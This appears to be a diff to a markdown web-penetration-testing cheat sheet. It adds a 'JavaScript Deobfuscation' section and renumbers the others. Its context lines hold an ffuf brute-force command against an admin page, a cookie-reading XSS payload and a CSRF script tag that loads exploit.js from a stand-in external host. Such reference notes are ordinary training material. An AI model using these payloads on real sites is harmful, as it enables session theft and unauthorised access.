@@ -8,11 +8,12 @@ Overview
 4. - [Browser Plugins](#4---browser-plugins)
 5. - [Web Reconnaissance](#5---web-reconnaissance)
 6. - [Fuzzing](#6---fuzzing)
-7. - [Sensitive Data Exposure](#7---sensitive-data-exposure)
-8. - [HTML Injection](#8---html-injection)
-9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
-10. - [Cross-Site Request Forgery (CSRF)](#10---cross-site-request-forgery-csrf)
-11. - [Exploit Research](#11---exploit-research)
+7. - [JavaScript Deobfuscation](#7---javascript-deobfuscation)
+8. - [Sensitive Data Exposure](#8---sensitive-data-exposure)
+9. - [HTML Injection](#9---html-injection)
+10. - [Cross-Site Scripting (XSS)](#10---cross-site-scripting-xss)
+11. - [Cross-Site Request Forgery (CSRF)](#11---cross-site-request-forgery-csrf)
+12. - [Exploit Research](#12---exploit-research)
 
    
 #1. - Web Requests
@@ -309,7 +310,10 @@ $ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file 
 $ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
 ```
 
-#7. - Sensitive Data Exposure
+#7. - JavaScript Deobfuscation
+-----------------------------------------
+
+#8. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -320,7 +324,7 @@ OR
 CTRL + U
 ```
 
-#8. - HTML Injection
+#9. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -329,7 +333,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#9. - Cross-Site Scripting (XSS)
+#10. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*
@@ -344,7 +348,7 @@ CTRL + U
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
-#10. - Cross-Site Request Forgery (CSRF)
+#11. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -353,7 +357,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#11. - Exploit Research
+#12. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
